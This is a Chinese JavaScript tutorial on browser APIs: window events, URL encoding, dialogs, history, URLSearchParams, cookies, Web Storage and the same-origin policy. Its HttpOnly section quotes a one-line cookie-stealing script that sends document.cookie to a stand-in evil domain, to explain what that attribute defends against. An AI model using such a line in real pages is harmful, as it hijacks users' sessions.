`window`对象可以接收以下事件。

##### 7.1 load 事件和 onload 属性

`load`事件发生在文档在浏览器窗口加载完毕时。`window.onload`属性可以指定这个事件的回调函数。

```javascript
window.onload = function() {
  var elements = document.getElementsByClassName("example");
  for (var i = 0; i < elements.length; i++) {
    var elt = elements[i];
    // ...
  }
};
```

上面代码在网页加载完毕后，获取指定元素并进行处理。

##### 7.2 error 事件和 onerror 属性

浏览器脚本发生错误时，会触发`window`对象的`error`事件。我们可以通过`window.onerror`属性对该事件指定回调函数。

```javascript
window.onerror = function(message, filename, lineno, colno, error) {
  console.log("出错了！--> %s", error.stack);
};
```

由于历史原因，`window`的`error`事件的回调函数不接受错误对象作为参数，而是一共可以接受五个参数，它们的含义依次如下。

---

- a.出错信息
- b.出错脚本的网址
- c.行号
- d.列号
- e.错误对象

---

> 老式浏览器只支持前三个参数。

并不是所有的错误，都会触发 JavaScript 的`error`事件（即让 JavaScript 报错）。一般来说，只有 JavaScript 脚本的错误，才会触发这个事件，而像资源文件不存在之类的错误，都不会触发。

下面是一个例子，如果整个页面未捕获错误超过 3 个，就显示警告。

```javascript
window.onerror = function(msg, url, line) {
  if (onerror.num++ > onerror.max) {
    alert("ERROR: " + msg + "\n" + url + ":" + line);
    return true;
  }
};
onerror.max = 3;
onerror.num = 0;
```

需要注意的是，如果脚本网址与网页网址不在同一个域（比如使用了 CDN），浏览器根本不会提供详细的出错信息，只会提示出错，错误类型是“`Script error.`”，行号为 0，其他信息都没有。这是浏览器防止向外部脚本泄漏信息。一个解决方法是在脚本所在的服务器，设置`Access-Control-Allow-Origin`的 HTTP 头信息。

`Access-Control-Allow-Origin: *`

然后，在网页的`<script>`标签中设置`crossorigin`属性。

`<script crossorigin="anonymous" src="//example.com/file.js"></script>`

上面代码的`crossorigin="anonymous"`表示，读取文件不需要身份信息，即不需要`cookie`和 HTTP 认证信息。如果设为`crossorigin="use-credentials"`，就表示浏览器会上传`cookie`和`HTTP`认证信息，同时还需要服务器端打开 HTTP 头信息`Access-Control-Allow-Credentials`。

#### 8.URL 的编码/解码方法

网页 URL 的合法字符分成两类。

---

- URL 元字符：分号（`;`），逗号（`,`），斜杠（`/`），问号（`?`），冒号（`:`），at（`@`），`&`，等号（`=`），加号（`+`），美元符号（`$`），井号（`#`）
- 语义字符：a-z，A-Z，0-9，连词号（`-`），下划线（`_`），点（`.`），感叹号（`!`），波浪线（`~`），星号（`*`），单引号（`\`），圆括号（`()`）

---

除了以上字符，其他字符出现在 URL 之中都必须转义，规则是根据操作系统的默认编码，将每个字节转为百分号（`%`）加上两个大写的十六进制字母。比如，`UTF-8`的操作系统上，`http://www.example.com/q=春节`这个 URL 之中，汉字“春节”不是 URL 的合法字符，所以被浏览器自动转成`http://www.example.com/q=%E6%98%A5%E8%8A%82`。其中，“春”转成了`%E6%98%A5`，“节”转成了“`%E8%8A%82`”。这是因为“春”和”节“的 UTF-8 编码分别是`E6 98 A5`和`E8 8A 82`，将每个字节前面加上百分号，就构成了**URL 编码**。

JavaScript 提供四个 URL 的编码/解码方法。

---

- `encodeURI()`
- `encodeURIComponent()`
- `decodeURI()`
- `decodeURIComponent()`

---

##### 8.1 encodeURI

`encodeURI` 方法的参数是一个字符串，代表整个 URL。它会将元字符和语义字符之外的字符，都进行转义。

```javascript
encodeURI("http://www.example.com/q=春节");
// "http://www.example.com/q=%E6%98%A5%E8%8A%82"
```

##### 8.2 encodeURIComponent

`encodeURIComponent`只转除了语义字符之外的字符，元字符也会被转义。因此，它的参数通常是 URL 的路径或参数值，而不是整个 URL。

```javascript
encodeURIComponent("春节");
// "%E6%98%A5%E8%8A%82"
encodeURIComponent("http://www.example.com/q=春节");
// "http%3A%2F%2Fwww.example.com%2Fq%3D%E6%98%A5%E8%8A%82"
```

上面代码中，`encodeURIComponent`会连 URL 元字符一起转义，所以通常只用它转 URL 的片段。

##### 8.3 decodeURI

`decodeURI`用于还原转义后的 URL。它是`encodeURI`方法的逆运算。

```javascript
decodeURI("http://www.example.com/q=%E6%98%A5%E8%8A%82");
// "http://www.example.com/q=春节"
```

##### 8.4 decodeURIComponent

`decodeURIComponent`用于还原转义后的 URL 片段。它是`encodeURIComponent`方法的逆运算。

`decodeURIComponent('%E6%98%A5%E8%8A%82')// "春节"`

#### 9.alert()，prompt()，confirm()

`alert()`、`prompt()`、`confirm()`都是浏览器与用户互动的全局方法。它们会弹出不同的对话框，要求用户做出回应。

需要注意的是，`alert()`、`prompt()`、`confirm()`这三个方法弹出的对话框，都是浏览器统一规定的式样，是无法定制的。

1).`alert`

`alert`方法弹出的对话框，只有一个“确定”按钮，往往用来通知用户某些信息。

```javascript
// 格式
alert(message);

// 实例
alert("Hello World");
```

用户只有点击“确定”按钮，对话框才会消失。在对话框弹出期间，浏览器窗口处于冻结状态，如果不点“确定”按钮，用户什么也干不了。

`alert`方法的参数只能是字符串，没法使用 CSS 样式，但是可以用`\n`指定换行。

2).`prompt`

`prompt`方法弹出的对话框，在提示文字的下方，还有一个输入框，要求用户输入信息，并有“确定”和“取消”两个按钮。它往往用来获取用户输入的数据。

```javascript
// 格式
var result = prompt(text[, default]);

// 实例
var result = prompt('您的年龄？', 25)
```

上面代码会跳出一个对话框，文字提示为“您的年龄？”，要求用户在对话框中输入自己的年龄（默认显示 25）。

`prompt`方法的返回值是一个字符串（有可能为空）或者`null`，具体分成三种情况。

---

- 用户输入信息，并点击“确定”，则用户输入的信息就是返回值。
- 用户没有输入信息，直接点击“确定”，则输入框的默认值就是返回值。
- 用户点击了“取消”（或者按了 Esc 按钮），则返回值是`null`。

---

`prompt`方法的第二个参数是可选的，但是如果不提供的话，IE 浏览器会在输入框中显示`undefined`。因此，最好总是提供第二个参数，作为输入框的默认值。

3).`confirm`

`confirm`方法弹出的对话框，除了提示信息之外，只有“确定”和“取消”两个按钮，往往用来征询用户的意见。

```javascript
// 格式
var result = confirm(message);

// 实例
var result = confirm("你最近好吗？");
```

上面代码弹出一个对话框，上面只有一行文字“你最近好吗？”，用户选择点击“确定”或“取消”。

`confirm`方法返回一个布尔值，如果用户点击“确定”，则返回 true；如果用户点击“取消”，则返回 false。

```javascript
var okay = confirm("Please confirm this message.");
if (okay) {
  // 用户按下“确定”
} else {
  // 用户按下“取消”
}
```

`confirm`的一个用途是，当用户离开当前页面时，弹出一个对话框，问用户是否真的要离开。

```javascript
window.onunload = function() {
  return confirm("你确定要离开当面页面吗？");
};
```

这三个方法都具有堵塞效应，一旦弹出对话框，整个页面就是暂停执行，等待用户做出反应。

### 3.history 对象

#### 1.概述

浏览器窗口有一个`history`对象，用来保存浏览历史。

如果当前窗口先后访问了三个网址，那么`history`对象就包括三项，`history.length`属性等于 3。

`history`对象提供了一系列方法，允许在浏览历史之间移动。

---

- `back()`：移动到上一个访问页面，等同于浏览器的后退键。
- `forward()`：移动到下一个访问页面，等同于浏览器的前进键。
- `go()`：接受一个整数作为参数，移动到该整数指定的页面，比如`go(1)`相当于`forward()`，`go(-1)`相当于`back()`。

---

```javascript
history.back();
history.forward();
history.go(-2);
```

如果移动的位置超出了访问历史的边界，以上三个方法并不报错，而是默默的失败。

`history.go(0)`相当于刷新当前页面。

常见的“返回上一页”链接，代码如下。

```javascript
document.getElementById("backLink").onclick = function() {
  window.history.back();
};
```

> 注意，返回上一页时，页面通常是从浏览器缓存之中加载，而不是重新要求服务器发送新的网页。

#### 2.history.pushState()

HTML5 为`history`对象添加了两个新方法，`history.pushState()`和`history.replaceState()`，用来在浏览历史中添加和修改记录。

```javascript
if (!!(window.history && history.pushState)) {
  // 支持History API
} else {
  // 不支持
}
```

上面代码可以用来检查，当前浏览器是否支持 History API。如果不支持的话，可以考虑使用 Polyfill 库 History.js。

`history.pushState`方法接受三个参数，依次为：

---

- `state`：一个与指定网址相关的状态对象，`popstate`事件触发时，该对象会传入回调函数。如果不需要这个对象，此处可以填`null`。
- `title`：新页面的标题，但是所有浏览器目前都忽略这个值，因此这里可以填`null`。
- `url`：新的网址，必须与当前页面处在同一个域。浏览器的地址栏将显示这个网址。

---

假定当前网址是 example.com/1.html，我们使用`pushState`方法在浏览记录（`history`对象）中添加一个新记录。

```javascript
var stateObj = { foo: "bar" };
history.pushState(stateObj, "page 2", "2.html");
```

添加上面这个新记录后，浏览器地址栏立刻显示 example.com/2.html，但并不会跳转到 2.html，甚至也不会检查 2.html 是否存在，它只是成为浏览历史中的最新记录。这时，你在地址栏输入一个新的地址(比如访问 google.com)，然后点击了倒退按钮，页面的 URL 将显示 2.html；你再点击一次倒退按钮，URL 将显示 1.html。

总之，`pushState`方法不会触发页面刷新，只是导致`history`对象发生变化，地址栏会有反应。

如果`pushState`的 url 参数，设置了一个新的锚点值（即`hash`），并不会触发`hashchange`事件。如果设置了一个跨域网址，则会报错。

```javascript
// 报错
history.pushState(null, null, "https://twitter.com/hello");
```

上面代码中，`pushState`想要插入一个跨域的网址，导致报错。这样设计的目的是，防止恶意代码让用户以为他们是在另一个网站上。

#### 3.history.replaceState()

`history.replaceState`方法的参数与`pushState`方法一模一样，区别是它修改浏览历史中当前纪录。

假定当前网页是 example.com/example.html。

```javascript
history.pushState({ page: 1 }, "title 1", "?page=1");
history.pushState({ page: 2 }, "title 2", "?page=2");
history.replaceState({ page: 3 }, "title 3", "?page=3");

history.back();
// url显示为http://example.com/example.html?page=1

history.back();
// url显示为http://example.com/example.html

history.go(2);
// url显示为http://example.com/example.html?page=3
```

#### 4.history.state 属性

`history.state`属性返回当前页面的`state`对象。

```javascript
history.pushState({ page: 1 }, "title 1", "?page=1");

history.state;
// { page: 1 }
```

#### 5.popstate 事件

每当同一个文档的浏览历史（即`history`对象）出现变化时，就会触发`popstate`事件。

需要注意的是，仅仅调用`pushState`方法或`replaceState`方法 ，并不会触发该事件，只有用户点击浏览器倒退按钮和前进按钮，或者使用 JavaScript 调用`back`、`forward`、`go`方法时才会触发。另外，该事件只针对同一个文档，如果浏览历史的切换，导致加载不同的文档，该事件也不会触发。

使用的时候，可以为`popstate`事件指定回调函数。

```javascript
window.onpopstate = function(event) {
  console.log("location: " + document.location);
  console.log("state: " + JSON.stringify(event.state));
};

// 或者

window.addEventListener("popstate", function(event) {
  console.log("location: " + document.location);
  console.log("state: " + JSON.stringify(event.state));
});
```

回调函数的参数是一个`event`事件对象，它的`state`属性指向`pushState`和`replaceState`方法为当前 URL 所提供的状态对象（即这两个方法的第一个参数）。上面代码中的`event.state`，就是通过`pushState`和`replaceState`方法，为当前 URL 绑定的`state`对象。

这个`state`对象也可以直接通过`history`对象读取。

`var currentState = history.state;`

注意，页面第一次加载的时候，浏览器不会触发`popstate`事件。

#### 6.URLSearchParams API

URLSearchParams API 用于处理 URL 之中的查询字符串，即问号之后的部分。没有部署这个 API 的浏览器，可以用 url-search-params 这个垫片库。

```javascript
var paramsString = "q=URLUtils.searchParams&topic=api";
var searchParams = new URLSearchParams(paramsString);
```

`URLSearchParams`有以下方法，用来操作某个参数。

---

- `has()`：返回一个布尔值，表示是否具有某个参数
- `get()`：返回指定参数的第一个值
- `getAll()`：返回一个数组，成员是指定参数的所有值
- `set()`：设置指定参数
- `delete()`：删除指定参数
- `append()`：在查询字符串之中，追加一个键值对
- `toString()`：返回整个查询字符串

---

```javascript
var paramsString = "q=URLUtils.searchParams&topic=api";
var searchParams = new URLSearchParams(paramsString);

searchParams.has("topic"); // true
searchParams.get("topic"); // "api"
searchParams.getAll("topic"); // ["api"]

searchParams.get("foo"); // null，注意Firefox返回空字符串
searchParams.set("foo", 2);
searchParams.get("foo"); // 2

searchParams.append("topic", "webdev");
searchParams.toString(); // "q=URLUtils.searchParams&topic=api&foo=2&topic=webdev"

searchParams.append("foo", 3);
searchParams.getAll("foo"); // [2, 3]

searchParams.delete("topic");
searchParams.toString(); // "q=URLUtils.searchParams&foo=2&foo=3"
```

`URLSearchParams`还有三个方法，用来遍历所有参数。

---

- `keys()`：遍历所有参数名
- `values()`：遍历所有参数值
- `entries()`：遍历所有参数的键值对

---

上面三个方法返回的都是`Iterator`对象。

```javascript
var searchParams = new URLSearchParams("key1=value1&key2=value2");

for (var key of searchParams.keys()) {
  console.log(key);
}
// key1
// key2

for (var value of searchParams.values()) {
  console.log(value);
}
// value1
// value2

for (var pair of searchParams.entries()) {
  console.log(pair[0] + ", " + pair[1]);
}
// key1, value1
// key2, value2
```

在 Chrome 浏览器之中，`URLSearchParams`实例本身就是`Iterator`对象，与`entries`方法返回值相同。所以，可以写成下面的样子。

```javascript
for (var p of searchParams) {
  console.log(p);
}
```

下面是一个替换当前 URL 的例子。

```javascript
// URL: https://example.com?version=1.0
var params = new URLSearchParams(location.search.slice(1));
params.set("version", 2.0);

window.history.replaceState({}, "", `${location.pathname}?${params}`);
// URL: https://example.com?version=2.0
```

`URLSearchParams`实例可以当作 POST 数据发送，所有数据都会 URL 编码。

```javascript
let params = new URLSearchParams();
params.append('api_key', '1234567890');

fetch('https://example.com/api', {
  method: 'POST',
  body: params
}).then(...)
```

DOM 的 a 元素节点的`searchParams`属性，就是一个`URLSearchParams`实例。

```javascript
var a = document.createElement("a");
a.href = "https://example.com?filter=api";
a.searchParams.get("filter"); // "api"
```

`URLSearchParams`还可以与 URL 接口结合使用。

```javascript
var url = new URL(location);
var foo = url.searchParams.get("foo") || "somedefault";
```

### 4.Cookie

#### 1.概述

`Cookie` 是服务器保存在浏览器的一小段文本信息，每个 `Cookie` 的大小一般不能超过 4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。

`Cookie` 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。

---

- 对话（session）管理：保存登录、购物车等需要记录的信息。
- 个性化：保存用户的偏好，比如网页的字体大小、背景色等等。
- 追踪：记录和分析用户行为。

---

有些开发者使用 `Cookie` 作为客户端储存。这样做虽然可行，但是并不推荐，因为 `Cookie` 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 `Web storage API` 和 `IndexedDB`。

`Cookie` 包含以下几方面的信息。

---

- a.`Cookie` 的名字
- b.`Cookie` 的值（真正的数据写在这里面）
- c.到期时间
- d.所属域名（默认是当前域名）
- e.生效的路径（默认是当前网址）

---

举例来说，用户访问网址`www.example.com`，服务器在浏览器写入一个 `Cookie`。这个 `Cookie` 就会包含`www.example.com`这个域名，以及根路径`/`。这意味着，这个 `Cookie` 对该域名的根路径和它的所有子路径都有效。如果路径设为`/forums`，那么这个 `Cookie` 只有在访问`www.example.com/forums`及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 `Cookie` 发送给服务器。

浏览器可以设置不接受 `Cookie`，也可以设置不向服务器发送 `Cookie`。`window.navigator.cookieEnabled`属性返回一个布尔值，表示浏览器是否打开 `Cookie` 功能。

```javascript
// 浏览器是否打开 Cookie 功能
window.navigator.cookieEnabled; // true
```

`document.cookie`属性返回当前网页的 `Cookie`。

```javascript
// 当前网页的 Cookie
document.cookie;
```

不同浏览器对 `Cookie` 数量和大小的限制，是不一样的。一般来说，单个域名设置的 `Cookie` 不应超过 30 个，每个 `Cookie` 的大小不能超过 4KB。超过限制以后，`Cookie` 将被忽略，不会被设置。

浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 `Cookie`。注意，这里不要求协议相同。也就是说，`http://example.com`设置的 `Cookie`，可以被`https://example.com`读取。

#### 2.Cookie 与 HTTP 协议

`Cookie` 由 HTTP 协议生成，也主要是供 HTTP 协议使用。

##### 2.1 HTTP 回应：Cookie 的生成

服务器如果希望在浏览器保存 `Cookie`，就要在 HTTP 回应的头信息里面，放置一个`Set-Cookie`字段。

`Set-Cookie:foo=bar`

上面代码会在浏览器保存一个名为 foo 的 `Cookie`，它的值为 bar。

HTTP 回应可以包含多个`Set-Cookie`字段，即在浏览器生成多个 `Cookie`。下面是一个例子。

```javascript
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

除了 `Cookie` 的值，`Set-Cookie`字段还可以附加 `Cookie` 的属性。

```javascript
Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
Set-Cookie: <cookie-name>=<cookie-value>; Secure
Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
```

一个`Set-Cookie`字段里面，可以同时包括多个属性，没有次序的要求。

`Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly`

下面是一个例子。

`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly`

如果服务器想改变一个早先设置的 `Cookie`，必须同时满足四个条件：`Cookie` 的`key`、`domain`、`path`和`secure`都匹配。举例来说，如果原始的 `Cookie` 是用如下的`Set-Cookie`设置的。

`Set-Cookie: key1=value1; domain=example.com; path=/blog`

改变上面这个 `Cookie` 的值，就必须使用同样的`Set-Cookie`。

`Set-Cookie: key1=value2; domain=example.com; path=/blog`

只要有一个属性不同，就会生成一个全新的 `Cookie`，而不是替换掉原来那个 `Cookie`。

`Set-Cookie: key1=value2; domain=example.com; path=/`

上面的命令设置了一个全新的同名 `Cookie`，但是`path`属性不一样。下一次访问`example.com/blog`的时候，浏览器将向服务器发送两个同名的 `Cookie`。

`Cookie: key1=value1; key1=value2`

上面代码的两个 `Cookie` 是同名的，匹配越精确的 `Cookie` 排在越前面。

##### 2.2 HTTP 请求：Cookie 的发送

浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的`Cookie`字段。

`Cookie: foo=bar`

上面代码会向服务器发送名为 foo 的 `Cookie`，值为 bar。

`Cookie`字段可以包含多个 `Cookie`，使用分号（;）分隔。

`Cookie: name=value; name2=value2; name3=value3`

下面是一个例子。

```javascript
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

服务器收到浏览器发来的 `Cookie` 时，有两点是无法知道的。

- `Cookie` 的各种属性，比如何时过期。
- 哪个域名设置的 `Cookie`，到底是一级域名设的，还是某一个二级域名设的。

#### 3.Cookie 的属性

##### 3.1 Expires，Max-Age

`Expires`属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 `Cookie`。它的值是 UTC 格式，可以使用`Date.prototype.toUTCString()`进行格式转换。

`Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;`

如果不设置该属性，或者设为`null`，`Cookie` 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 `Cookie` 就会被删除。另外，浏览器根据本地时间，决定 `Cookie` 是否过期，由于本地时间是不精确的，所以没有办法保证 `Cookie` 一定会在服务器指定的时间过期。

`Max-Age`属性指定从现在开始 `Cookie` 存在的秒数，比如`60 * 60 * 24 * 365`（即一年）。过了这个时间以后，浏览器就不再保留这个 `Cookie`。

如果同时指定了`Expires`和`Max-Age`，那么`Max-Age`的值将优先生效。

如果`Set-Cookie`字段没有指定`Expires`或`Max-Age`属性，那么这个 `Cookie` 就是 `Session Cookie`，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 `Cookie`。

##### 3.2 Domain，Path

`Domain`属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 `Cookie`。如果没有指定该属性，浏览器会默认将其设为当前 URL 的一级域名，比如`www.example.com`会设为`example.com`，而且以后如果访问`example.com`的任何子域名，HTTP 请求也会带上这个 `Cookie`。如果服务器在`Set-Cookie`字段指定的域名，不属于当前域名，浏览器会拒绝这个 `Cookie`。

`Path`属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 `Cookie`。只要浏览器发现，`Path`属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 `Cookie`。比如，`PATH`属性是`/`，那么请求`/docs`路径也会包含该 `Cookie`。当然，前提是域名必须一致。

##### 3.3 Secure，HttpOnly

`Secure`属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 `Cookie` 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的`Secure`属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。

`HttpOnly`属性指定该 `Cookie` 无法通过 JavaScript 脚本拿到，主要是`Document.cookie`属性、`XMLHttpRequest`对象和 `Request API` 都拿不到该属性。这样就防止了该 `Cookie` 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 `Cookie`。

`(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;`

上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 `Cookie` 发往第三方服务器。如果设置了一个 `Cookie` 的`HttpOnly`属性，上面代码就不会读到该 `Cookie`。

#### 4.document.cookie

`document.cookie`属性用于读写当前网页的 `Cookie`。

读取的时候，它会返回当前网页的所有 `Cookie`，前提是该 `Cookie` 不能有`HTTPOnly`属性。

`document.cookie // "foo=bar;baz=bar"`

上面代码从`document.cookie`一次性读出两个 `Cookie`，它们之间使用分号分隔。必须手动还原，才能取出每一个 `Cookie` 的值。

```javascript
var cookies = document.cookie.split(";");

for (var i = 0; i < cookies.length; i++) {
  console.log(cookies[i]);
}
// foo=bar
// baz=bar
```

`document.cookie`属性是可写的，可以通过它为当前网站添加 `Cookie`。

`document.cookie = 'fontSize=14';`

写入的时候，`Cookie` 的值必须写成`key=value`的形式。注意，等号两边不能有空格。另外，写入 `Cookie` 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 `Cookie` 的值），这可以用`encodeURIComponent`方法达到。

但是，`document.cookie`一次只能写入一个 `Cookie`，而且写入并不是覆盖，而是添加。

```javascript
document.cookie = "test1=hello";
document.cookie = "test2=world";
document.cookie;
// test1=hello;test2=world
```

`document.cookie`读写行为的差异（一次可以读出全部 `Cookie`，但是只能写入一个 `Cookie`），与 HTTP 协议的 `Cookie` 通信格式有关。浏览器向服务器发送 `Cookie` 的时候，`Cookie`字段是使用一行将所有 `Cookie` 全部发送；服务器向浏览器设置 `Cookie` 的时候，`Set-Cookie`字段是一行设置一个 `Cookie`。

写入 `Cookie` 的时候，可以一起写入 `Cookie` 的属性。

`document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";`

上面代码中，写入 `Cookie` 的时候，同时设置了`expires`属性。属性值的等号两边，也是不能有空格的。

各个属性的写入注意点如下。

---

- `path`属性必须为绝对路径，默认为当前路径。
- `domain`属性值必须是当前发送 `Cookie` 的域名的一部分。比如，当前域名是 example.com，就不能将其设为 foo.com。该属性默认为当前的一级域名（不含二级域名）。
- `max-age`属性的值为秒数。
- `expires`属性的值为 UTC 格式，可以使用`Date.prototype.toUTCString()`进行日期格式转换。

---

`document.cookie`写入 `Cookie` 的例子如下。

```javascript
document.cookie =
  "fontSize=14; " +
  "expires=" +
  someDate.toGMTString() +
  "; " +
  "path=/subdirectory; " +
  "domain=*.example.com";
```

`Cookie` 的属性一旦设置完成，就没有办法读取这些属性的值。

删除一个现存 `Cookie` 的唯一方法，是设置它的`expires`属性为一个过去的日期。

`document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';`

上面代码中，名为`fontSize`的 `Cookie` 的值为空，过期时间设为 1970 年 1 月 1 月零点，就等同于删除了这个 `Cookie`。

### 5.Web Storage：浏览器端数据储存机制

#### 1.概述

这个 API 的作用是，使得网页可以在浏览器端储存数据。它分成两类：`sessionStorage`和`localStorage`。

`sessionStorage`保存的数据用于浏览器的一次会话，当会话结束（通常是该窗口关闭），数据被清空；`localStorage`保存的数据长期存在，下一次访问该网站的时候，网页可以直接读取以前保存的数据。除了保存期限的长短不同，这两个对象的属性和方法完全一样。

它们很像`cookie`机制的强化版，能够动用大得多的存储空间。目前，每个域名的存储上限视浏览器而定，Chrome 是 2.5MB，Firefox 和 Opera 是 5MB，IE 是 10MB。其中，Firefox 的存储空间由一级域名决定，而其他浏览器没有这个限制。也就是说，在 Firefox 中，`a.example.com`和`b.example.com`共享 5MB 的存储空间。另外，与`Cookie`一样，它们也受同域限制。某个网页存入的数据，只有同域下的网页才能读取。

通过检查`window`对象是否包含`sessionStorage`和`localStorage`属性，可以确定浏览器是否支持这两个对象。

```javascript
function checkStorageSupport() {
  // sessionStorage
  if (window.sessionStorage) {
    return true;
  } else {
    return false;
  }

  // localStorage
  if (window.localStorage) {
    return true;
  } else {
    return false;
  }
}
```

#### 2.操作方法

##### 2.1 存入/读取数据

`sessionStorage`和`localStorage`保存的数据，都以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。

存入数据使用`setItem`方法。它接受两个参数，第一个是键名，第二个是保存的数据。

```javascript
sessionStorage.setItem("key", "value");
localStorage.setItem("key", "value");
```

读取数据使用`getItem`方法。它只有一个参数，就是键名。

```javascript
var valueSession = sessionStorage.getItem("key");
var valueLocal = localStorage.getItem("key");
```

##### 2.2 清除数据

`removeItem`方法用于清除某个键名对应的数据。

```javascript
sessionStorage.removeItem("key");
localStorage.removeItem("key");
```

`clear`方法用于清除所有保存的数据。

```javascript
sessionStorage.clear();
localStorage.clear();
```

##### 2.3 遍历操作

利用`length`属性和`key`方法，可以遍历所有的键。

```javascript
for (var i = 0; i < localStorage.length; i++) {
  console.log(localStorage.key(i));
}
```

其中的`key`方法，根据位置（从 0 开始）获得键值。

`localStorage.key(1);`

#### 3.storage 事件

当储存的数据发生变化时，会触发`storage`事件。我们可以指定这个事件的回调函数。

`window.addEventListener("storage",onStorageChange);`

回调函数接受一个`event`对象作为参数。这个`event`对象的`key`属性，保存发生变化的键名。

```javascript
function onStorageChange(e) {
  console.log(e.key);
}
```

除了`key`属性，`event`对象的属性还有三个：

---

- `oldValue`：更新前的值。如果该键为新增加，则这个属性为`null`。
- `newValue`：更新后的值。如果该键被删除，则这个属性为`null`。
- `url`：原始触发`storage`事件的那个网页的网址。

---

值得特别注意的是，该事件不在导致数据变化的当前页面触发。如果浏览器同时打开一个域名下面的多个页面，当其中的一个页面改变 `localStorage`的数据时，其他所有页面的`storage`事件会被触发，而原始页面并不触发`storage`事件。可以通过这种机制，实现多个窗口之间的通信。所有浏览器之中，只有 IE 浏览器除外，它会在所有页面触发`storage`事件。

### 6.同源政策

浏览器安全的基石是**同源政策（same-origin policy）**。

#### 1.概述

##### 1.1 含义

1995 年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。

最初，它的含义是指，A 网页设置的 `Cookie`，B 网页不能打开，除非这两个网页“同源”。所谓“同源”指的是”三个相同“。

---

- 协议相同
- 域名相同
- 端口相同

---

举例来说，`http://www.example.com/dir/page.html`这个网址，协议是`http://`，域名是`www.example.com`，端口是`80`（默认端口可以省略），它的同源情况如下。

```javascript
http://www.example.com/dir2/other.html：同源
http://example.com/dir/other.html：不同源（域名不同）
http://v2.www.example.com/dir/other.html：不同源（域名不同）
http://www.example.com:81/dir/other.html：不同源（端口不同）
https://www.example.com/dir/page.html：不同源（协议不同）
```

##### 1.2 目的

同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。

设想这样一种情况：A 网站是一家银行，用户登录以后，A 网站在用户的机器上设置了一个 `Cookie`，包含了一些隐私信息（比如存款总额）。用户离开 A 网站以后，又去访问 B 网站，如果没有同源限制，B 网站可以读取 A 网站的 `Cookie`，那么隐私信息就会泄漏。更可怕的是，`Cookie` 往往用来保存用户的登录状态，如果用户没有退出登录，其他网站就可以冒充用户，为所欲为。因为浏览器同时还规定，提交表单不受同源政策的限制。

由此可见，同源政策是必需的，否则 `Cookie` 可以共享，互联网就毫无安全可言了。

##### 1.3 限制范围

随着互联网的发展，同源政策越来越严格。目前，如果非同源，共有三种行为受到限制。

---

- 无法读取非同源网页的 `Cookie`、`LocalStorage` 和 `IndexedDB`。
- 无法接触非同源网页的 DOM。
- 无法向非同源地址发送 AJAX 请求（可以发送，但浏览器会拒绝接受响应）。

---

另外，通过 JavaScript 脚本可以拿到其他窗口的`window`对象。如果是非同源的网页，目前允许一个窗口可以接触其他网页的`window`对象的九个属性和四个方法。

---

- `window.closed`
- `window.frames`
- `window.length`
- `window.location`
- `window.opener`
- `window.parent`
- `window.self`
- `window.top`
- `window.window`

---

- `window.blur()`
- `window.close()`
- `window.focus()`
- `window.postMessage()`

---

上面的九个属性之中，只有`window.location`是可读写的，其他八个全部都是只读。

虽然这些限制是必要的，但是有时很不方便，合理的用途也受到影响。下面介绍如何规避上面的限制。

#### 2.Cookie

`Cookie` 是服务器写入浏览器的一小段信息，只有同源的网页才能共享。如果两个网页一级域名相同，只是次级域名不同，浏览器允许通过设置`document.domain`共享 `Cookie`。

举例来说，A 网页的网址是`http://w1.example.com/a.html`，B 网页的网址是`http://w2.example.com/b.html`，那么只要设置相同的`document.domain`，两个网页就可以共享 `Cookie`。因为浏览器通过`document.domain属性来检查是否同源`。

```javascript
// 两个网页都需要设置
document.domain = "example.com";
```

注意，A 和 B 两个网页都需要设置`document.domain`属性，才能达到同源的目的。因为设置`document.domain`的同时，会把端口重置为`null`，因此如果只设置一个网页的`document.domain`，会导致两个网址的端口不同，还是达不到同源的目的。

现在，A 网页通过脚本设置一个 `Cookie`。

`document.cookie = "test1=hello";`

B 网页就可以读到这个 `Cookie`。

`var allCookie = document.cookie;`

注意，这种方法只适用于 `Cookie` 和 `iframe` 窗口，`LocalStorage` 和 `IndexedDB` 无法通过这种方法，规避同源政策，而要使用下文介绍 `PostMessage API`。

